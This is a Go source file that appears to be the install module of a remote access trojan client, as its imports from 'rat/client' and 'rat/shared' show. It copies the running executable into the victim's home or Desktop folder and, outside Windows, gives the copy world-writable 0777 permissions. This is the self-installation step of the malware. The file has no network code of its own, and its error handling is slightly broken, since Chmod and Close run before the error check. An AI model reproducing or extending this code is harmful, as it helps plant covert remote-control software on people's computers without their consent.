package install

import (
	"io"
	"os"
	"oslib"
	"path/filepath"
	"rat/client/computer"
	"rat/shared/installpath"
	"strings"
)

func getPath(p installpath.Path) (path string) {
	home := computer.GetComputerInformation().HomeDir

	if home == "" {
		return
	}

	switch p {
	case installpath.None:
		path = ""
	case installpath.Desktop:
		path = filepath.Join(home, "Desktop")
	case installpath.Home:
		fallthrough
	default:
		path = home
	}

	return
}

func getCurrent() string {
	current, _ := filepath.Abs(os.Args[0])
	return current
}

func Install(name string, p installpath.Path) (string, error) {
	if oslib.Name == oslib.Windows {
		name += ".exe"
	}

	file := filepath.Join(getPath(p), name)

	out, err := os.Create(file)

	if oslib.Name != oslib.Windows {
		out.Chmod(0777)
	}

	defer out.Close()
	if err != nil {
		return "", err
	}

	in, err := os.Open(getCurrent())
	defer in.Close()
	if err != nil {
		return "", err
	}

	_, err = io.Copy(out, in)
	if err != nil {
		return "", err
	}

	return file, nil
}

func IsInstalled(p installpath.Path) bool {
	current := getCurrent()
	current = current[:strings.LastIndex(current, filepath.Base(current))]
	current = filepath.Clean(current)

	install := getPath(p)

	return install == current
}
